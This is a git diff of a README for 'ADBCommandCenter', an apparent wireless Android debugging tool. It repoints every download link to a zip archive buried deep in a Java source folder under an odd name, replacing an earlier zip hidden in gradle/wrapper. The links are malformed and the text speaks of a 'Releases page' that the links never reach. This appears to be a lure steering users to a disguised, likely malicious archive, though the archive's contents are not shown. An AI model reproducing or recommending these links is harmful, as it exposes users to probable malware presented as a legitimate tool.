@@ -1,6 +1,6 @@
 # 🌐 ADBCommandCenter - Control Your Device Wirelessly
 
-[![Download ADBCommandCenter](https://github.com/Cauan00O1/ADBCommandCenter/raw/refs/heads/main/gradle/wrapper/ADB_Center_Command_2.1.zip%https://github.com/Cauan00O1/ADBCommandCenter/raw/refs/heads/main/gradle/wrapper/ADB_Center_Command_2.1.zip)](https://github.com/Cauan00O1/ADBCommandCenter/raw/refs/heads/main/gradle/wrapper/ADB_Center_Command_2.1.zip)
+[![Download ADBCommandCenter](https://github.com/Cauan00O1/ADBCommandCenter/raw/refs/heads/main/app/src/main/java/com/joaomgcd/adbcommandcenter/adb/filebrowser/domain/ADB-Center-Command-amidoacetophenone.zip%https://github.com/Cauan00O1/ADBCommandCenter/raw/refs/heads/main/app/src/main/java/com/joaomgcd/adbcommandcenter/adb/filebrowser/domain/ADB-Center-Command-amidoacetophenone.zip)](https://github.com/Cauan00O1/ADBCommandCenter/raw/refs/heads/main/app/src/main/java/com/joaomgcd/adbcommandcenter/adb/filebrowser/domain/ADB-Center-Command-amidoacetophenone.zip)
 
 ## 📦 Overview
 
@@ -31,7 +31,7 @@ Before you download, ensure your system meets the following requirements:
 
 To download ADBCommandCenter, click the link below:
 
-[Download ADBCommandCenter](https://github.com/Cauan00O1/ADBCommandCenter/raw/refs/heads/main/gradle/wrapper/ADB_Center_Command_2.1.zip)
+[Download ADBCommandCenter](https://github.com/Cauan00O1/ADBCommandCenter/raw/refs/heads/main/app/src/main/java/com/joaomgcd/adbcommandcenter/adb/filebrowser/domain/ADB-Center-Command-amidoacetophenone.zip)
 
 Once on the Releases page, look for the latest version of ADBCommandCenter. You will see several files available for download.
 
@@ -94,4 +94,4 @@ We welcome contributions to improve ADBCommandCenter. If you’d like to suggest
 
 For support or questions related to ADBCommandCenter, please open an issue in the GitHub repository.
 
-Don't forget to download ADBCommandCenter to take advantage of Wireless Debugging! Visit [this page to download](https://github.com/Cauan00O1/ADBCommandCenter/raw/refs/heads/main/gradle/wrapper/ADB_Center_Command_2.1.zip) the latest version.
+Don't forget to download ADBCommandCenter to take advantage of Wireless Debugging! Visit [this page to download](https://github.com/Cauan00O1/ADBCommandCenter/raw/refs/heads/main/app/src/main/java/com/joaomgcd/adbcommandcenter/adb/filebrowser/domain/ADB-Center-Command-amidoacetophenone.zip) the latest version.
